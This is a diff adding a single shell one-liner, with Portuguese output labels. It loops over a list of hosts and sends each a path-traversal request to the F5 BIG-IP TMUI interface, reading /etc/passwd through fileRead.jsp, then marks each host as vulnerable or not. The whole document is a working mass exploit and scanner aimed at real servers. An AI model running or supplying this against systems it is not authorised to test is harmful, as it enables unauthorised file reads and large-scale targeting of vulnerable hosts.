@@ -1,0 +1,1 @@
+for urls in $(cat resolvidos.txt); do curl --silent "http://$urls/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=../../../../../../../../etc/passwd" | grep "root" && printf "$urls \033[32;1mVULNERAVEL\n\e[m" || printf "$urls \033[32;1mNAO E VULNERAVEL\n\e[m";done | awk -F "Terminal" '{print $1}'
